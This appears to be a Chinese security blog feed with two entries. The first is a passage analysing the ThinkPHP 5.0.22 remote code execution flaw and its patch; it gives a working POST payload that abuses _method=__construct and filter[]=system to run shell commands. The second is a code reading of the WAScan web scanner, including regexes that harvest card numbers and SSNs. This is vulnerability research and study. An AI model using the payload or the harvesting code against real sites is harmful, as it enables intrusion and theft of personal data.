(isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) &#123; $this-&gt;method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']); &#125; else &#123; $this-&gt;method = $this-&gt;server('REQUEST_METHOD') ?: 'GET'; &#125; &#125; return $this-&gt;method;&#125; 在tp的默认中配置中设置了表单请求类型伪装变量如下 因此通过POST一个_method参数，即可进入判断，并执行$this-&gt;{$this-&gt;method}($_POST)语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组 Request类的构造函数__construct代码如下1234567891011121314protected function __construct($options = [])&#123; foreach ($options as $name =&gt; $item) &#123; if (property_exists($this, $name)) &#123; $this-&gt;$name = $item; &#125; &#125; if (is_null($this-&gt;filter)) &#123; $this-&gt;filter = Config::get('default_filter'); &#125; // 保存 php://input $this-&gt;input = file_get_contents('php://input');&#125; 利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。其中$this-&gt;filter保存着全局过滤规则。经过覆盖，相关变量变为：123456$this method = &quot;get&quot; get = &#123;array&#125; [0] 0 = dir filter = &#123;array&#125; [0] 0 = system 注意我们请求的路由是?s=captcha，它对应的注册规则为\think\Route::get。在method方法结束后，返回的$this-&gt;method值应为get这样才能不出错，所以payload中有个method=get。在进行完路由检测后，执行self::exec($dispatch, $config)，在thinkphp/library/think/App.php:445，由于$dispatch值为method，将会进入如下分支:123456789101112protected static function exec($dispatch, $config)&#123; switch ($dispatch['type']) &#123; ... case 'method': // 回调方法 $vars = array_merge(Request::instance()-&gt;param(), $dispatch['var']); $data = self::invokeMethod($dispatch['method'], $vars); break; ... &#125; return $data;&#125; 跟入Request::instance()-&gt;param()，该方法用于处理请求中的各种参数。12345678910111213public function param($name = '', $default = null, $filter = '')&#123; if (empty($this-&gt;mergeParam)) &#123; $method = $this-&gt;method(true); ... &#125; ... // 当前请求参数和URL地址中的参数合并 $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); $this-&gt;mergeParam = true; ... return $this-&gt;input($this-&gt;param, $name, $default, $filter);&#125; 如上方法中$this-&gt;param通过array_merge将当前请求参数和URL地址中的参数合并。回忆一下前面已经通过__construct设置了$this-&gt;get为dir。此后$this-&gt;param其值被设置为： 继续跟入$this-&gt;input:1234567891011public function input($data = [], $name = '', $default = null, $filter = '')&#123; ... // 解析过滤器 $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) &#123; array_walk_recursive($data, [$this, 'filterValue'], $filter); reset($data); &#125; ...&#125; 该方法用于对请求中的数据即接收到的参数进行过滤，而过滤器通过$this-&gt;getFilter获得：12345678910111213141516protected function getFilter($filter, $default)&#123; if (is_null($filter)) &#123; $filter = []; &#125; else &#123; $filter = $filter ?: $this-&gt;filter; if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) &#123; $filter = explode(',', $filter); &#125; else &#123; $filter = (array) $filter; &#125; &#125; $filter[] = $default; return $filter;&#125; 前面$this-&gt;filter已经被设置为system，所以getFilter返回后$filter值为： 回到input函数，由于$data是前面传入的$this-&gt;param即数组，所以接着会调用array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter)，对$data中的每一个值调用filterValue函数，最终调用了call_user_func执行代码: 扩展之POC 2回想前面的调用链，param -&gt; method -&gt; input -&gt; getFilter -&gt; rce。因为filter可控，而tp的逻辑会对输入即input进行filter过滤，所以重点是找到一个合理的input入口。 回到param方法：12345678public function param($name = '', $default = null, $filter = '')&#123; if (empty($this-&gt;mergeParam)) &#123; $method = $this-&gt;method(true); ... &#125; ...&#125; 跟入$this-&gt;method(true)注意此时的参数为true，所以此处会进入第一个分支:12345678public function method($method = false)&#123; if (true === $method) &#123; // 获取原始请求类型 return $this-&gt;server('REQUEST_METHOD') ?: 'GET'; &#125; ... &#125; 继续跟入$this-&gt;server，可以发现这里也有一个input!12345678910public function server($name = '', $default = null, $filter = '')&#123; if (empty($this-&gt;server)) &#123; $this-&gt;server = $_SERVER; &#125; if (is_array($name)) &#123; return $this-&gt;server = array_merge($this-&gt;server, $name); &#125; return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);&#125; 所以对input方法而言，其$data即$this-&gt;server数组，其参数name值为REQUEST_METHOD，在input方法源码如下：123456789101112131415161718192021222324public function input($data = [], $name = '', $default = null, $filter = '')&#123; ... $name = (string) $name; if ('' != $name) &#123; ... foreach (explode('.', $name) as $val) &#123; if (isset($data[$val])) &#123; $data = $data[$val]; &#125; else &#123; // 无输入数据，返回默认值 return $default; &#125; &#125; ... &#125; // 解析过滤器 $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) &#123; array_walk_recursive($data, [$this, 'filterValue'], $filter); reset($data); &#125; ...&#125; 因此利用前面的__construct，可以通过传入server[REQUEST_METHOD]=dir，使得在经过foreach循环时置$data值为dir，此后调用getFilter，同样实现RCE: 给出payload：12345http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami 补丁分析补丁地址:https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003 问题的根源在于请求方法的获取接收了不可信数据，因此补丁中设置了白名单，如下 其他这里仅仅测试了5.0.22 完整版本。各个版本之间代码有些许差异，payload不一定通用，建议自己调试调试。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[WAScan源码阅读]]></title>
      <url>%2F2019%2F01%2F04%2FWAScan%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%2F</url>
      <content type="text"><![CDATA[WAScan源码阅读 项目地址：https://github.com/m4ll0k/WAScan.git README python2.7 整体功能指纹识别 cms系统 6 web框架 22 cookeis/headers安全 开发语言 9 操作系统 7 服务器 all 防火墙 50+ 攻击 Bash 命令注入 SQL盲注 溢出 CRLF 头部SQL注入 头部XSS HTML注入 LDAP注入 本地文件包含 执行操作系统命令 php 代码注入 SQL注入 服务器端注入 Xpath注入 XSS XML注入 检查 Apache状态检测 开放跳转 phpinfo robots.txt xst 暴力攻击 admin面板 后门 备份目录 备份文件 常规目录 常规文件 隐藏参数 信息搜集 信用卡信息 邮箱 私有ip 错误信息 ssn 整体结构 类型 名 作用 dir lib 扩展，攻击用到的一些字典等等 dir plugin 主要攻击脚本 dir screen 一些截图 file .gitignore 略 file LICENSE 许可证 file README.md 介绍 file wascan.py 主入口文件 所有文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243WAScan├── lib│ ├── db│ │ ├── adminpanel.wascan│ │ ├── backdoor.wascan│ │ ├── commondir.wascan│ │ ├── commonfile.wascan│ │ ├── errors│ │ │ ├── buffer.json│ │ │ ├── ldap.json│ │ │ ├── lfi.json│ │ │ └── xpath.json│ │ ├── openredirect.wascan│ │ ├── params.wascan│ │ ├── phpinfo.wascan│ │ ├── sqldberror│ │ │ ├── db2.json│ │ │ ├── firebird.json│ │ │ ├── frontbase.json│ │ │ ├── hsqldb.json│ │ │ ├── informix.json│ │ │ ├── ingres.json│ │ │ ├── maccess.json│ │ │ ├── maxdb.json│ │ │ ├── mssql.json│ │ │ ├── mysql.json│ │ │ ├── oracle.json│ │ │ ├── postgresql.json│ │ │ ├── sqlite.json│ │ │ └── sybase.json│ │ └── useragent.wascan│ ├── handler│ │ ├── attacks.py│ │ ├── audit.py│ │ ├── brute.py│ │ ├── crawler.py│ │ ├── disclosure.py│ │ ├── fingerprint.py│ │ ├── fullscan.py│ │ └── __init__.py│ ├── __init__.py│ ├── parser│ │ ├── getcc.py│ │ ├── getip.py│ │ ├── getmail.py│ │ ├── getssn.py│ │ ├── __init__.py│ │ └── parse.py│ ├── request│ │ ├── crawler.py│ │ ├── __init__.py│ │ ├── ragent.py│ │ └── request.py│ └── utils│ ├── check.py│ ├── colors.py│ ├── dirs.py│ ├── exception.py│ ├── __init__.py│ ├── params.py│ ├── payload.py│ ├── printer.py│ ├── rand.py│ ├── readfile.py│ ├── settings.py│ ├── unicode.py│ └── usage.py├── LICENSE├── plugins│ ├── attacks│ │ ├── bashi.py│ │ ├── blindsqli.py│ │ ├── bufferoverflow.py│ │ ├── crlf.py│ │ ├── headersqli.py│ │ ├── headerxss.py│ │ ├── htmli.py│ │ ├── __init__.py│ │ ├── ldapi.py│ │ ├── lfi.py│ │ ├── oscommand.py│ │ ├── phpi.py│ │ ├── sqli.py│ │ ├── ssi.py│ │ ├── xpathi.py│ │ ├── xss.py│ │ └── xxe.py│ ├── audit│ │ ├── apache.py│ │ ├── __init__.py│ │ ├── open_redirect.py│ │ ├── phpinfo.py│ │ ├── robots.py│ │ └── xst.py│ ├── brute│ │ ├── adminpanel.py│ │ ├── backdoor.py│ │ ├── backupdir.py│ │ ├── backupfile.py│ │ ├── commondir.py│ │ ├── commonfile.py│ │ ├── __init__.py│ │ └── params.py│ ├── disclosure│ │ ├── creditcards.py│ │ ├── emails.py│ │ ├── errors.py│ │ ├── __init__.py│ │ ├── privateip.py│ │ └── ssn.py│ ├── fingerprint│ │ ├── cms│ │ │ ├── adobeaem.py│ │ │ ├── drupal.py│ │ │ ├── __init__.py│ │ │ ├── joomla.py│ │ │ ├── magento.py│ │ │ ├── plone.py│ │ │ ├── silverstripe.py│ │ │ └── wordpress.py│ │ ├── framework│ │ │ ├── apachejackrabbit.py│ │ │ ├── asp_mvc.py│ │ │ ├── cakephp.py│ │ │ ├── cherrypy.py│ │ │ ├── codeigniter.py│ │ │ ├── dancer.py│ │ │ ├── django.py│ │ │ ├── flask.py│ │ │ ├── fuelphp.py│ │ │ ├── grails.py│ │ │ ├── horde.py│ │ │ ├── __init__.py│ │ │ ├── karrigell.py│ │ │ ├── larvel.py│ │ │ ├── nette.py│ │ │ ├── phalcon.py│ │ │ ├── play.py│ │ │ ├── rails.py│ │ │ ├── seagull.py│ │ │ ├── spring.py│ │ │ ├── symfony.py│ │ │ ├── web2py.py│ │ │ ├── yii.py│ │ │ └── zend.py│ │ ├── header│ │ │ ├── cookies.py│ │ │ ├── header.py│ │ │ └── __init__.py│ │ ├── __init__.py│ │ ├── language│ │ │ ├── aspnet.py│ │ │ ├── asp.py│ │ │ ├── coldfusion.py│ │ │ ├── flash.py│ │ │ ├── __init__.py│ │ │ ├── java.py│ │ │ ├── perl.py│ │ │ ├── php.py│ │ │ ├── python.py│ │ │ └── ruby.py│ │ ├── os│ │ │ ├── bsd.py│ │ │ ├── ibm.py│ │ │ ├── __init__.py│ │ │ ├── linux.py│ │ │ ├── mac.py│ │ │ ├── solaris.py│ │ │ ├── unix.py│ │ │ └── windows.py│ │ ├── server│ │ │ ├── __init__.py│ │ │ └── server.py│ │ └── waf│ │ ├── airlock.py│ │ ├── anquanbao.py│ │ ├── armor.py│ │ ├── asm.py│ │ ├── aws.py│ │ ├── baidu.py│ │ ├── barracuda.py│ │ ├── betterwpsecurity.py│ │ ├── bigip.py│ │ ├── binarysec.py│ │ ├── blockdos.py│ │ ├── ciscoacexml.py│ │ ├── cloudflare.py│ │ ├── cloudfront.py│ │ ├── comodo.py│ │ ├── datapower.py│ │ ├── denyall.py│ │ ├── dotdefender.py│ │ ├── edgecast.py│ │ ├── expressionengine.py│ │ ├── fortiweb.py│ │ ├── hyperguard.py│ │ ├── incapsula.py│ │ ├── __init__.py│ │ ├── isaserver.py│ │ ├── jiasule.py│ │ ├── knownsec.py│ │ ├── kona.py│ │ ├── modsecurity.py│ │ ├── netcontinuum.py│ │ ├── netscaler.py│ │ ├── newdefend.py│ │ ├── nsfocus.py│ │ ├── paloalto.py│ │ ├── profense.py│ │ ├── radware.py│ │ ├── requestvalidationmode.py│ │ ├── safe3.py│ │ ├── safedog.py│ │ ├── secureiis.py│ │ ├── senginx.py│ │ ├── sitelock.py│ │ ├── sonicwall.py│ │ ├── sophos.py│ │ ├── stingray.py│ │ ├── sucuri.py│ │ ├── teros.py│ │ ├── trafficshield.py│ │ ├── urlscan.py│ │ ├── uspses.py│ │ ├── varnish.py│ │ ├── wallarm.py│ │ ├── webknight.py│ │ ├── yundun.py│ │ └── yunsuo.py│ └── __init__.py├── README.md├── screen│ ├── screen_2.png│ ├── screen_3.png│ ├── screen_4.png│ ├── screen_5.png│ ├── screen_6.png│ ├── screen_7.png│ ├── screen_8.png│ └── screen.png└── wascan.py22 directories, 218 files 入口文件：wascan.py主入口文件。会先初始化一些Usage，接受命令行参数并进行相关的前期处理。然后根据参数开始进行扫描。 12345if __name__ == "__main__": try: wascan().main() except KeyboardInterrupt,e: exit(warn('Exiting... :(')) 定义了一个wascan类，通过getopt.getopt接受命令行参数。对应代码如下： 123456789101112131415161718192021222324252627282930313233343536373839for opt,arg in opts: # CUrl 检查URL ，并规范化 if opt in ('-u','--url'):url = CUrl(arg) # CScan 检查scan参数是否符合范围 if opt in ('-s','--scan'):scan = CScan(arg) # CHeaders 传入参数为字符串，调用该函数解析成dict if opt in ('-H','--headers'):kwargs['headers'] = CHeaders(arg) # POST 体的参数 if opt in ('-d','--data'):kwargs['data'] = arg # 是否进行暴力破解 if opt in ('-b','--brute'):kwargs['brute'] = True # 指定请求方法 if opt in ('-m','--method'):kwargs['method'] = arg # 指定 host ，将其值更新到 header头 的 Host字段 if opt in ('-h','--host'):kwargs['headers'].update(&#123;'Host':arg&#125;) # 指定 referer，将其值更新到 header头 if opt in ('-R','--referer'):kwargs['headers'].update(&#123;'Referer':arg&#125;) # 指定 auth if opt in ('-a','--auth'):kwargs['auth'] = CAuth(arg) # 指定 agent if opt in ('-A','--agent'):kwargs['agent'] = arg # 指定 cookie if opt in ('-C','--cookie'):kwargs['cookie'] = arg # 采用随机的 agent if opt in ('-r','--ragent'):kwargs['agent'] = ragent() # 采用代理 if opt in ('-p','--proxy'):kwargs['proxy'] = arg # 代理是否要认证 if opt in ('-P','--proxy-auth'):kwargs['pauth'] = CAuth(arg) # 指定超时时间 if opt in ('-t','--timeout'):kwargs['timeout'] = float(arg) # 对于302情况，是否要跟随，默认为 False不跳转 if opt in ('-n','--redirect'):kwargs['redirect'] = False # 是否开启指纹识别 if opt in ('-v','--verbose'):verbose = True # 输出版本信息 if opt in ('-V','--version'):version = Version() # 输出帮助信息 if opt in ('-hh','--help'):self.usage.basic(True) scan参数为扫描类型，对应如下： scan值 扫描类型 0 指纹Fingerprint 1 攻击Attacks 2 审计Audit 3 爆破Brute 4 信息搜集Disclosure 5 全面扫描 对应代码如下：1234567891011121314151617181920212223242526272829303132333435363738class wascan(object): ...省略... def main(self): ...省略... scan = "5" ...省略... try: # 打印时间和URL PTIME(url) if kwargs['brute']: BruteParams(kwargs,url,kwargs['data']).run() if scan == 0: Fingerprint(kwargs,url).run() if scan == 1: Attacks(kwargs,url,kwargs['data']) if scan == 2: Audit(kwargs,url,kwargs['data']) if scan == 3: Brute(kwargs,url,kwargs['data']) if scan == 4: Disclosure(kwargs,url,kwargs['data']).run() # full scan if int(scan) == 5: info('Starting full scan module...') Fingerprint(kwargs,url).run() for u in Crawler().run(kwargs,url,kwargs['data']): test('Testing URL: %s'%(u)) if '?' not in url: warn('Not found query in this URL... Skipping..') if type(u[0]) is tuple: kwargs['data'] = u[1] FullScan(kwargs,u[0],kwargs['data']) else: FullScan(kwargs,u,kwargs['data']) Audit(kwargs,parse.netloc,kwargs['data']) Brute(kwargs,parse.netloc,kwargs['data']) except WascanUnboundLocalError,e: pass lib/parser 文件夹主要定义一些匹配模式，用于查找页面上的各种信息。1234567│ ├── parser│ │ ├── getcc.py│ │ ├── getip.py│ │ ├── getmail.py│ │ ├── getssn.py│ │ ├── __init__.py│ │ └── parse.py 信用卡：lib/parser/getcc.py获取信用卡信息12345def getcc(content): """Credit Card""" CC_LIST = re.findall(r'((^|\s)\d&#123;4&#125;[- ]?(\d&#123;4&#125;[- ]?\d&#123;4&#125;|\d&#123;6&#125;)[- ]?(\d&#123;5&#125;|\d&#123;4&#125;)($|\s))',content) if CC_LIST != None or CC_LIST != []: return CC_LIST IP：lib/parser/getip.py获取ip12345def getip(content): """Private IP""" IP_LIST = re.findall(r'[0-9]+(?:\.[0-9]+)&#123;3&#125;',content,re.I) if IP_LIST != None or IP_LIST != []: return IP_LIST 邮箱：lib/parer/getmail.py获取邮箱12345def getmail(content): """E-mail""" EMAIL_LIST = re.findall(r'[a-zA-Z0-9.\-_+#~!$&amp;\',;=:]+@+[a-zA-Z0-9-]*\.\w*',content) if EMAIL_LIST != None or EMAIL_LIST != []: return EMAIL_LIST US SSN: lib/parser/getssn.py12345def getssn(content): """US Social Security number""" SSN_LIST = re.findall(r'(((?!000)(?!666)(?:[0-6]\d&#123;2&#125;|7[0-2][0-9]|73[0-3]|7[5-6][0-9]|77[0-2]))-((?!00)\d&#123;2&#125;)-((?!0000)\d&#123;4&#125;))',content) if SSN_LIST != None or SSN_LIST != []: return SSN_LIST 抓取解析: lib/parser/parse.pyparse类，进行真正的信息搜集工作。定义了clean方法，将响应中的各种标签，各种可能的符号直接replace掉，然后再进行真正的搜索。简单粗暴。1234567891011121314151617181920212223242526272829303132333435363738class parse: def __init__(self,content): self.content = content def clean(self): """Clean HTML Response""" self.content = re.sub('&lt;em&gt;','',self.content) self.content = re.sub('&lt;b&gt;','',self.content) self.content = re.sub('&lt;/b&gt;','',self.content) self.content = re.sub('&lt;strong&gt;','',self.content) self.content = re.sub('&lt;/strong&gt;','',self.content) self.content = re.sub('&lt;/em&gt;','',self.content) self.content = re.sub('&lt;wbr&gt;','',self.content) self.content = re.sub('&lt;/wbr&gt;','',self.content) self.content = re.sub('&lt;li&gt;','',self.content) self.content = re.sub('&lt;/li&gt;','',self.content) for x in ('&gt;', ':', '=', '&lt;', '/', '\\', ';', '&amp;', '%3A', '%3D', '%3C'): self.content = string.replace(self.content,x,' ') def getmail(self): """Get Emails""" self.clean() return getmail(self.content) def getip(self): """ Get IP """ self.clean() return getip(self.content) def getcc(self): """ Get Credit Card""" self.clean() return getcc(self.content) def getssn(self): """ """ self.clean() return getssn(self.content) lib/request 文件夹主要是定义一些跟请求相关的方法/类/功能12345│ ├── request│ │ ├── crawler.py│ │ ├── __init__.py│ │ ├── ragent.py│ │ └── request.py 爬虫：lib/request/crawler.py如名，爬虫。爬取页面上的所有连接。1234567891011try: from BeautifulSoup import BeautifulSoupexcept ImportError: from bs4 import BeautifulSoup# 定义了要排除的情况。比如 确定是 7z后缀名，说明是压缩包 而不是网页EXCLUDED_MEDIA_EXTENSIONS = ( '.7z', '.aac', '.aiff', '.au', '.avi', '.bin', '.bmp', '.cab', '.dll', '.dmp', '.ear', '.exe', '.flv', '.gif', '.gz', '.image', '.iso', '.jar', '.jpeg', '.jpg', '.mkv', '.mov', '.mp3', '.mp4', '.mpeg', '.mpg', '.pdf', '.png', '.ps', '.rar', '.scm', '.so', '.tar', '.tif', '.war', '.wav', '.wmv', '.zip') 接下来是爬虫类SCrawler，它继承自Request类。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198class SCrawler(Request): """ Simple Crawler """ def __init__(self,kwargs,url,data): # 父类初始化 Request.__init__(self,kwargs) # url self.url = url # post 的 data体 self.data = data # 表格？ self.forms = [] # ok 的 链接 self.ok_links = [] # 所有 链接 self.all_links = [] # 协议 self.scheme = urlsplit(url).scheme # 域名 self.netloc = urlsplit(url).netloc # 内容 初始化为 空 self.content = None def run(self): # send request resp = self.Send(url=self.url,data=self.data) # 获取响应内容 self.content = resp.content # 调用extract解析出相应内容 self.extract for link in self.all_links: # 对于 all_links 中的所有链接，包括 绝对URL 、 相对URL # 调用 absolute(link) 统一为 绝对URL r_link = self.absolute(link) if r_link: # 如果 r_link 还未被收录到 ok_links 中，则添加 if r_link not in self.ok_links: self.ok_links.append(r_link) return self.ok_links @property # 疑问：&lt;img src="" &gt; 此链接不收取？ def extract(self): # href 找到页面里所有的 超链接 &lt;a href="http://test/com"&gt;test&lt;/a&gt; for tag in self.soup.findAll('a',href=True): # 添加到 all_links 中 self.all_links.append(tag['href'].split('#')[0]) # src 找到页面里所有的 连接 &lt;frame src=""&gt; &lt;iframe src=""&gt; for tag in self.soup.findAll(['frame','iframe'],src=True): self.all_links.append(tag['src'].split('#')[0]) # formaction 定位 button 提取formaction &lt;button type="submit" formaction="demo_admin.asp"&gt;以管理员身份提交&lt;/button&gt; for tag in self.soup.findAll('button',formaction=True): self.all_links.append(tag['formaction']) # extract form # &lt;form action="demo_form.asp" method="get"&gt; # &lt;input type="text" name="lname" /&gt; # &lt;button type="submit"&gt;提交&lt;/button&gt;&lt;br /&gt; form = self.form() if form != None and form != []: if form not in self.all_links: self.all_links.append(form) @property def soup(self): soup = BeautifulSoup(self.content) return soup # 检查link中的 后缀名 def check_ext(self,link): """check extension""" if link not in EXCLUDED_MEDIA_EXTENSIONS: return link # 检查是否有定义 method，若无则默认为 GET def check_method(self,method): """check method""" if method != []: return "GET" elif method != []: return method[0] # 检查 url 的合法性 # 编码 、空格、 # 等 def check_url(self,url): """check url""" url = unquote_plus(url) url = url.replace("&amp;amp;","&amp;") url = url.replace("#","") url = url.replace(" ","+") return url # 检查 action 对应的值 def check_action(self,action,url): """ check form action """ if action == [] or action[0] == "/": return self.check_url(url) elif action != [] and action != "": if action[0] in url: self.check_url(url) else: return self.check_url(CPath(url+action[0])) def check_name_value(self,string): """ check form name and value """ if string == []: return "TEST" elif string != []: return string[0] # &lt;form action="demo_form.asp" method="get"&gt; # &lt;input type="text" name="lname" /&gt; # &lt;button type="submit"&gt;提交&lt;/button&gt;&lt;br /&gt; def form(self): """ search forms """ # 搜索表格 加入到 self.forms 中 for form in self.soup.findAll('form'): if form not in self.forms: self.forms.append(form) for form in self.forms: if form != "" and form != None: # 调用 extract_form 将 url 从中解析出来 return self.extract_form(str(form),self.url) # &lt;form action="demo_form.asp" method="get"&gt; # &lt;input type="text" name="lname" /&gt; # &lt;button type="submit"&gt;提交&lt;/button&gt;&lt;br /&gt; def extract_form(self,form,url): """ extract form """ query = [] action = "" method = "" try: # method method += self.check_method(findall(r'method=[\'\"](.+?)[\'\"]',form,I)) # action action += self.check_action((findall(r'method=[\'\"](.+?)[\'\"]',form,I),url)) except Exception,e: pass # 寻找form中的参数 ，并保存到 query 中 for inputs in form.split('/&gt;'): if search(r'\&lt;input',inputs,I): try: # name name = self.check_name_value(findall(r'name=[\'\"](.+?)[\'\"]',inputs,I)) # value value = self.check_name_value(findall(r'value=[\'\"](.+?)[\'\"]',inputs,I)) name_value = "%s=%s"%(name,value) if len(query) == 0:query.append(name_value) if len(query) == 1:query[0] += "&amp;%s"%(name_value) except Exception,e: pass # 根据 method 的不同，组装url if action: if method.lower() == "get": if query != []: return "%s?%s"%(action,query[0]) return action elif method.lower() == "post": if query != []: return action,query[0] return action # 注，这里存在BUG。 # 调用链 form = self.form() # form() 的返回 return self.extract_form(str(form),self.url) # extract_form 在 method为 POST 且 query != [] 的情况下 ， # return action,query[0] # 会丢失掉 query[0] 即 POST 的参数 # 获取绝对URL def absolute(self,link): """ make absolute url """ link = self.check_ext(link) parts = urlsplit(link) # urlsplit scheme = ucode(parts.scheme) netloc = ucode(parts.netloc) path = ucode(parts.path) or '/' query = ucode(parts.query) # make if scheme == 'http' or scheme == 'https': if netloc != "": if netloc in self.netloc: return urlunparse((scheme,netloc,path,'',query,'')) # elif link.startswith('//'): if netloc != "": if self.netloc in netloc: return urlunparse((self.scheme,netloc,(path or '/'),'',query,'')) # elif link.startswith('/'): return urlunparse((self.scheme,self.netloc,path,'',query,'')) # elif link.startswith('?'): return urlunparse((self.scheme,self.netloc,path,'',query,'')) # elif link == "" or link.startswith('#'): return self.url # else: return urlunparse((self.scheme,self.netloc,path,'',query,'')) User Agent： lib/request/ragent.py生成随机的 User-Agent。命令行选项wascan.py --ragent开启。12345678def ragent(): """random agent""" user_agents = () realpath = path.join(path.realpath(__file__).split('lib')[0],'lib/db/') realpath += "useragent.wascan" for _ in readfile(realpath): user_agents += (_,) return user_agents[randint(0,len(user_agents)-1)] 请求：lib/requests/request.py基本请求。包括请求/代理认证，请求，重定向，响应的处理。 两个方法用于请求/代理认证1234567891011121314151617181920212223if hasattr(ssl, '_create_unverified_context'): ssl._create_default_https_context = ssl._create_unverified_context# BasicAuthCredentials 用来处理 认证相关的信息# wascan.py --url xxx --proxy yyy --proxy-auth "root:1234"# wascan.py --url xxx --auth "admin:1233"# In [20]: creds = "admin:123"# In [21]: BasicAuthCredentials(creds)# Out[21]: ('admin', '123')def BasicAuthCredentials(creds): # return tuple return tuple( creds.split(':') )# wascan.py --url xxx --scan yyy --proxy 10.10.10.10:80 def ProxyDict(proxy): # return dict return &#123; 'http' : proxy, 'https' : proxy &#125; Request类，发送基本请求，处理头部参数，认证、代理、cookie、超时等问题。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109class Request(object): """docstring for Request""" # 接受参数 def __init__(self,*kwargs): self.kwargs = kwargs # 发送请求 def Send(self,url,method="get",data=None,headers=None): # make a request # 提取各项参数 并 保存到 __dict__ ，后期进一步处理 _dict_ = self.kwargs[0] # self.kwargs is a tuple, select [0] # 获取各项值 auth = None if "auth" not in _dict_ else _dict_["auth"] agent = None if "agent" not in _dict_ else _dict_["agent"] proxy = None if "proxy" not in _dict_ else _dict_["proxy"] pauth = None if "pauth" not in _dict_ else _dict_["pauth"] cookie = None if "cookie" not in _dict_ else _dict_["cookie"] timeout = None if "timeout" not in _dict_ else _dict_["timeout"] redirect = True if "redirect" not in _dict_ else _dict_["redirect"] _headers_ = None if "headers" not in _dict_ else _dict_["headers"] _data_ = None if "data" not in _dict_ else _dict_["data"] _method_ = None if "method" not in _dict_ else _dict_["method"] # set method if method: if _method_ != None: method = _method_.upper() else: method = method.upper() # set data if data is None: if _data_ != None: data = _data_ else: data = &#123;&#125; # if headers == None: headers = &#123;&#125; if headers is None: headers = &#123;&#125; # if auth == None: auth = () if auth is None: auth = () # set request headers # add user-agent header value if 'User-Agent' not in headers: headers['User-Agent'] = agent # _headers_ add to headers if isinstance(_headers_,dict): headers.update(_headers_) # 处理 认证 、代理 # process basic authentication if auth != None and auth != (): if ':' in auth: authorization = ("%s:%s"%(BasicAuthCredentials(auth))).encode('base64') headers['Authorization'] = "Basic %s"%(authorization.replace('\n','')) # process proxy basic authorization if pauth != None: if ':' in pauth: proxy_authorization = ("%s:%s"%(BasicAuthCredentials(pauth))).encode('base64') headers['Proxy-authorization'] = "Basic %s"%(proxy_authorization.replace('\n','')) # 处理 超时问题 # process socket timeout if timeout != None: socket.setdefaulttimeout(timeout) # set handlers # handled http and https handlers = [urllib2.HTTPHandler(),urllib2.HTTPSHandler()] # process cookie handler if 'Cookie' not in headers: if cookie != None and cookie != "": headers['Cookie'] = cookie # handlers.append(HTTPCookieProcessor(cookie)) # process redirect # 处理是否跳转 ， NoRedirectHandler 定义见下 if redirect != True: handlers.append(NoRedirectHandler) # process proxies if proxy: proxies = ProxyDict(proxy) handlers.append(urllib2.ProxyHandler(proxies)) # install opener opener = urllib2.build_opener(*handlers) urllib2.install_opener(opener) # process method # method get if method == "GET": if data: url = "%s?%s"%(url,data) req = urllib2.Request(url,headers=headers) # other methods elif method == "POST": req = urllib2.Request(url,data=data,headers=headers) # other methods else: req = urllib2.Request(url,headers=headers) req.get_method = lambda : method # response object try: resp = urllib2.urlopen(req) except urllib2.HTTPError,e: resp = e except socket.error,e: exit(warn('Error: %s'%e)) except urllib2.URLError,e: exit(warn('Error: %s'%e)) return ResponseObject(resp) NoRedirectHandler，不进行跳转。123456class NoRedirectHandler(urllib2.HTTPRedirectHandler): """docstring for NoRedirectHandler""" def http_error_302(self,req,fp,code,msg,headers): pass # http status code 302 http_error_302 = http_error_302 = http_error_302 = http_error_302 响应处理类。获取响应内容，响应url，响应的status_code，响应的头部。1234567891011class ResponseObject(object): """docstring for ResponseObject""" def __init__(self,resp): # get content self.content = resp.read() # get url self.url = resp.geturl() # get status code self.code = resp.getcode() # get headers self.headers = resp.headers.dict lib/utils 文件夹主要是定义一些小功能、小工具1234567891011121314│ └── utils│ ├── check.py│ ├── colors.py│ ├── dirs.py│ ├── exception.py│ ├── __init__.py│ ├── params.py│ ├── payload.py│ ├── printer.py│ ├── rand.py│ ├── readfile.py│ ├── settings.py│ ├── unicode.py│ └── usage.py package标识：lib/utils/init.py无，跳过 基本检查：lib/utils/check.py如名，主要进行一些前期的检查准备。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166#!/usr/bin/env python # -*- coding:utf-8 -*-## @name: Wascan - Web Application Scanner# @repo: https://github.com/m4ll0k/Wascan# @author: Momo Outaadi (M4ll0k)# @license: See the file 'LICENSE.txt'from re import sub,I,findallfrom lib.utils.colors import *from lib.utils.printer import *from urlparse import urlsplit,urljoinfrom lib.utils.rand import r_string# CPath 检查路径，用于处理 绝对/相对路径，生成完整路径# 实际调用 urlparse 的 urljoin# In [43]: 